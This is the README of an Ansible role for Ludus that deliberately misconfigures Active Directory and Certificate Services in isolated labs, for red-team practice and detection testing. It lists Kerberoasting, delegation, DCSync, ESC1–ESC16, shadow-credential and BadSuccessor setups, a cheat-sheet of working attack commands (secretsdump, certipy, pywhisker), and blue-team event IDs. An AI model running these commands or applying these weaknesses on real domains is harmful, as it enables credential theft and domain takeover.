# ludus_ad_misconfigs

Generic Active Directory misconfiguration role for [Ludus](https://ludus.cloud) attack-path labs. Applies deliberately vulnerable AD, AD CS, and dMSA configurations to a domain so red teamers can practice — and defenders can detect — the common (and newer) privilege-escalation primitives.

Every misconfiguration is **opt-in and data-driven**: nothing is applied unless you populate the matching variable. Leave a list empty (`[]`) — or a scalar `null` — and its task is skipped.

## Supported misconfigurations

### Classic AD
| Misconfiguration | Variable | Primitive |
|------------------|----------|-----------|
| Kerberoasting | `ludus_ad_kerberoasting` | SPN on user → crackable TGS |
| AS-REP Roasting | `ludus_ad_asreproast` | `DONT_REQ_PREAUTH` → crackable AS-REP |
| Unconstrained Delegation | `ludus_ad_unconstrained_delegation` | `TRUSTED_FOR_DELEGATION` → TGT capture |
| Constrained Delegation | `ludus_ad_constrained_delegation` | `msDS-AllowedToDelegateTo` → S4U2Proxy |
| Resource-Based Constrained Delegation | `ludus_ad_rbcd` | `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| DCSync rights | `ludus_ad_dcsync` | `DS-Replication-Get-Changes*` → hash dump |
| ACL abuse | `ludus_ad_acl_abuse` | GenericAll / WriteDacl / WriteOwner over object |
| Weak / known passwords | `ludus_ad_weak_passwords` | password spraying / brute force |
| Credentials in description | `ludus_ad_password_in_description` | secrets in `description` / `info` |
| Privileged group membership | `ludus_ad_group_membership` | add principal to Domain Admins etc. |

### AD CS (Certificate Services)
| Misconfiguration | Variable | ESC | Primitive |
|------------------|----------|-----|-----------|
| Vulnerable templates | `ludus_ad_adcs_templates` | ESC1/2/3/9/13/15 | template flags / EKU / OID abuse |
| CA-wide registry flags | `ludus_ad_adcs_ca_flags` | ESC6/11/16 | `EDITF_ATTRIBUTESUBJECTALTNAME2`, weak RPC, SID-ext removal |
| AD CS ACLs | `ludus_ad_adcs_acl` | ESC4/7 | write over template / ManageCA rights |

### Newer (2024–2025)
| Misconfiguration | Variable | Primitive |
|------------------|----------|-----------|
| **BadSuccessor** (dMSA) | `ludus_ad_badsuccessor` | CreateChild for dMSA over OU → impersonate anyone (WS 2025) |
| Shadow Credentials | `ludus_ad_shadow_credentials` | write `msDS-KeyCredentialLink` → PKINIT as victim |
| Machine Account Quota | `ludus_ad_machine_account_quota` | `ms-DS-MachineAccountQuota` → attacker-owned computer accounts |
| GPO abuse | `ludus_ad_gpo_abuse` | edit rights on GPO → code exec on linked objects |

> **Not deployable as a simple setting** (documented but out of scope): ESC5 (broad PKI object ACLs), ESC8/ESC11 relay stage, ESC10 (`altSecurityIdentities` / registry mapping), ESC12 (CA key theft), ESC14 (cross-domain mapping). These require relay infrastructure or post-compromise access, not a one-shot attribute change.

## Requirements

- Ludus range with a working AD domain (a DC and at least one member host)
- Target running Windows Server 2019 / 2022 (2025 for BadSuccessor / dMSA)
- The `ActiveDirectory` PowerShell module on the host running the tasks (present on a DC / RSAT host)
- **AD CS tasks:** an Enterprise CA installed in the domain. Template tasks manipulate objects in the Configuration NC (run on the DC); `adcs_ca_flags` / ESC7 run on the **CA server** (`certutil`). PSPKI recommended for fine-grained ESC7.
- **GPO abuse:** `GroupPolicy` PowerShell module (RSAT-GPMC)
- Ansible >= 2.9, collection `ansible.windows`

> Run the role on your **domain controller VM** — most tasks edit AD objects and ACLs and need domain rights. CA-registry tasks must reach the CA host.

## Role variables

All variables default to `[]` (or `null`). See `defaults/main.yml` for inline examples of every field.

### Classic AD (abbreviated — see defaults for full schema)
```yaml
ludus_ad_kerberoasting:
  - { user: "svc-sql", spn: "MSSQLSvc/sql01.corp.local:1433", password: "Summer2024!" }
ludus_ad_asreproast:
  - { user: "svc-legacy" }
ludus_ad_unconstrained_delegation:
  - { name: "WEB-SBG", type: "computer" }
ludus_ad_constrained_delegation:
  - { name: "APP-SBG", allowed_to: ["cifs/DC-SBG.corp.local"], protocol_transition: true }
ludus_ad_rbcd:
  - { source: "WEB-SBG", target: "DC-SBG" }
ludus_ad_dcsync:
  - { principal: "CORP\\lowpriv" }
ludus_ad_acl_abuse:
  - { principal: "CORP\\lowpriv", target: "Domain Admins", right: "GenericAll" }
ludus_ad_weak_passwords:
  - { user: "helpdesk", password: "Welcome1", never_expires: true }
ludus_ad_password_in_description:
  - { user: "svc-backup", text: "temp pw: Backup2023!" }
ludus_ad_group_membership:
  - { member: "CORP\\lowpriv", group: "Domain Admins" }
```

### AD CS — vulnerable templates (`ludus_ad_adcs_templates`)
```yaml
ludus_ad_adcs_templates:
  # ESC1 — enrollee supplies subject + Client Auth EKU, no approval
  - esc: "esc1"
    name: "VulnClientAuth"
    base_template: "User"
    enrollees: "Domain Users"
    ca: ""                       # "" auto-detects the issuing CA
  # ESC2 — Any Purpose EKU
  - { esc: "esc2", name: "VulnAnyPurpose" }
  # ESC3 — Certificate Request Agent EKU
  - { esc: "esc3", name: "VulnEnrollAgent" }
  # ESC9 — CT_FLAG_NO_SECURITY_EXTENSION (breaks strong mapping)
  - { esc: "esc9", name: "VulnNoSecExt" }
  # ESC13 — issuance policy OID linked to a privileged group
  - { esc: "esc13", name: "VulnPolicyLink", policy_oid: "1.3.6.1.4.1.311.21.8.x.y" }
  # ESC15 — v1 schema, application-policy injection (CVE-2024-49019)
  - { esc: "esc15", name: "VulnV1", base_template: "WebServer" }
```
Each entry: clones `base_template`, sets the ESC-specific `msPKI-*` flags / EKUs, grants Enroll + AutoEnroll to `enrollees`, and publishes the template to the CA.

### AD CS — CA-wide flags (`ludus_ad_adcs_ca_flags`)
```yaml
ludus_ad_adcs_ca_flags:
  - { esc: "esc6" }              # +EDITF_ATTRIBUTESUBJECTALTNAME2  (SAN on any template)
  - { esc: "esc11" }            # -IF_ENFORCEENCRYPTICERTREQUEST   (unencrypted RPC)
  - { esc: "esc16" }            # +szOID_NTDS_CA_SECURITY_EXT to DisableExtensionList
```
Runs `certutil -setreg` on the CA server and restarts `certsvc`.

### AD CS — ACLs (`ludus_ad_adcs_acl`)
```yaml
ludus_ad_adcs_acl:
  - { esc: "esc4", principal: "CORP\\lowpriv", target: "User", right: "GenericAll" }
  - { esc: "esc7", principal: "CORP\\lowpriv", ca_right: "ManageCA" }
```

### BadSuccessor (`ludus_ad_badsuccessor`)
```yaml
ludus_ad_badsuccessor:
  - principal: "CORP\\lowpriv"
    ou: "OU=ServiceAccounts,DC=corp,DC=local"
```
Grants `principal` CreateChild rights for the `msDS-DelegatedManagedServiceAccount` class over `ou`. That principal can then create a dMSA, set `msDS-ManagedAccountPrecededByLink` to a target account and `msDS-DelegatedMSAState=2`, and authenticate as that account. **Windows Server 2025 domains only.**

### Shadow Credentials (`ludus_ad_shadow_credentials`)
```yaml
ludus_ad_shadow_credentials:
  - { principal: "CORP\\lowpriv", victim: "DC-SBG" }
```
Grants `principal` WriteProperty over the victim's `msDS-KeyCredentialLink`.

### Machine Account Quota (`ludus_ad_machine_account_quota`)
```yaml
ludus_ad_machine_account_quota: 10   # null = leave as-is, 0 = disable
```

### GPO abuse (`ludus_ad_gpo_abuse`)
```yaml
ludus_ad_gpo_abuse:
  - { principal: "CORP\\lowpriv", gpo: "Default Domain Policy", target_type: "User" }
```

## Example range config

```yaml
ludus:
  - vm_name: "{{ range_id }}-DC"
    hostname: "DC-SBG"
    template: win2022-server-x64-template
    domain: { fqdn: corp.local, role: primary-dc }
    roles:
      - ludus_ad_misconfigs
    role_vars:
      ludus_ad_kerberoasting:
        - { user: "svc-sql", spn: "MSSQLSvc/sql01.corp.local:1433", password: "Summer2024!" }
      ludus_ad_rbcd:
        - { source: "WEB-SBG", target: "DC-SBG" }
      ludus_ad_dcsync:
        - { principal: "CORP\\lowpriv" }
      ludus_ad_adcs_templates:
        - { esc: "esc1", name: "VulnClientAuth", enrollees: "Domain Users" }
      ludus_ad_adcs_ca_flags:
        - { esc: "esc6" }
      ludus_ad_badsuccessor:
        - { principal: "CORP\\lowpriv", ou: "OU=ServiceAccounts,DC=corp,DC=local" }
```

Apply:
```bash
ludus range config set -f ludus-range-config.yml
ludus range deploy
```

## Attack cheat-sheet (post-deploy)

Reference primitives — adjust host / domain / tooling to your range.

```bash
# Kerberoasting / AS-REP roasting
GetUserSPNs.py -request -dc-ip <DC> corp.local/lowpriv:Password1
GetNPUsers.py  -request -dc-ip <DC> corp.local/ -usersfile users.txt

# Constrained / RBCD delegation (S4U)
getST.py -spn cifs/DC-SBG.corp.local -impersonate Administrator \
  -dc-ip <DC> 'corp.local/WEB-SBG$:<password>'

# DCSync
secretsdump.py -just-dc corp.local/lowpriv:Password1@<DC>

# AD CS — ESC1 (enrollee-supplies-subject)
certipy req -u lowpriv@corp.local -p Password1 -ca CORP-CA \
  -target dc-sbg.corp.local -template VulnClientAuth -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip <DC>

# AD CS — ESC6 / ESC9 / ESC16 follow the same certipy req/auth flow
# ESC7:  certipy ca -add-officer ... / issue pending requests

# Shadow Credentials
certipy shadow auto -u lowpriv@corp.local -p Password1 -account DC-SBG$
#   or: pywhisker -d corp.local -u lowpriv -p Password1 --target DC-SBG$ --action add

# BadSuccessor (dMSA) — WS 2025
#   SharpSuccessor.exe add /impersonate:Administrator \
#     /path:"OU=ServiceAccounts,DC=corp,DC=local" /account:lowpriv /name:badDMSA
#   then request a TGT for badDMSA$ -> PAC carries Administrator's groups

# GPO abuse
#   SharpGPOAbuse.exe --AddComputerTask ... --GPOName "Default Domain Policy"
```

## Detection notes (blue team)

The misconfigs map to well-known signals — useful when using this role to validate detections:
- BadSuccessor: Event **5137** (dMSA create), **5136** (`msDS-ManagedAccountPrecededByLink` / `msDS-DelegatedMSAState` change), **2946** (KERB-DMSA-KEY-PACKAGE auth)
- AD CS abuse: Event **4886/4887** (cert request/issue), certificates with attacker SAN/UPN
- Shadow Credentials: **5136** on `msDS-KeyCredentialLink`
- DCSync: **4662** replication GUID access from non-DC principals

## Warning

This role **intentionally weakens** Active Directory security. Deploy only in isolated lab ranges. Never run against production or internet-reachable environments.

## References

- SpecterOps — *Certified Pre-Owned* (ESC1–ESC8)
- ly4k **Certipy** wiki — Privilege Escalation (ESC1–ESC16)
- xbz0n — *Breaking ADCS: ESC1 to ESC16*
- Akamai (Yuval Gordon) — *BadSuccessor: abusing dMSA*
- Unit 42 / Semperis / iPurple.team — BadSuccessor analysis & detection

## License

GPL-2.0-or-later

## Author

Whispergate
